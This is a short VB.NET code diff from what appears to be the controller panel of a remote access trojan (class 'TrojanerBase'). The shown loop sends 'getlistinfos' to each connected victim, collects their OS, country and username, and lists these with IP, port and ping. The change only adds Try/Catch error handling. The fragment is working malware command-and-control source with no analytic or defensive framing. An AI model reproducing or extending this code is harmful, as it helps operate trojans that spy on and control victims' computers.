@@ -37,26 +37,27 @@ Public Class Form1
         'Try
         'My.Computer.Audio.Play(My.Resources.connected, AudioPlayMode.Background)
         For Each t As TrojanerBase In Server
-            'Try
-            Dim lvi As ListViewItem = ListView1.Items.Add(t.number)
-            Dim ipport() As String = t.client.Client.RemoteEndPoint.ToString().Split(":")
+            Try
+                Dim lvi As ListViewItem = ListView1.Items.Add(t.number)
+                Dim ipport() As String = t.client.Client.RemoteEndPoint.ToString().Split(":")
 
-            t.w.WriteLine("getlistinfos")
-            t.w.Flush()
-            Dim gett As String = t.r.ReadLine()
-            Dim os As String = b(gett.Split("|")(0))
-            Dim land As String = b(gett.Split("|")(1))
-            Dim username As String = b(gett.Split("|")(2))
+                t.w.WriteLine("getlistinfos")
+                t.w.Flush()
+                Dim gett As String = t.r.ReadLine()
+                Dim os As String = b(gett.Split("|")(0))
+                Dim land As String = b(gett.Split("|")(1))
+                Dim username As String = b(gett.Split("|")(2))
 
-            lvi.SubItems.Add(username)
-            lvi.SubItems.Add(ipport(0))
-            lvi.SubItems.Add(ipport(1))
-            lvi.SubItems.Add(os)
-            lvi.SubItems.Add(GetPing(ipport(0)))
-            lvi.SubItems.Add(land)
-            'Catch ex As Exception
-            'Server.Remove(t)
-            'End Try
+                lvi.SubItems.Add(username)
+                lvi.SubItems.Add(ipport(0))
+                lvi.SubItems.Add(ipport(1))
+                lvi.SubItems.Add(os)
+                lvi.SubItems.Add(GetPing(ipport(0)))
+                lvi.SubItems.Add(land)
+            Catch ex As Exception
+                'Server.Remove(t)
+                MsgBox(ex.ToString())
+            End Try
         Next
         'Catch ex As Exception
         'End Try
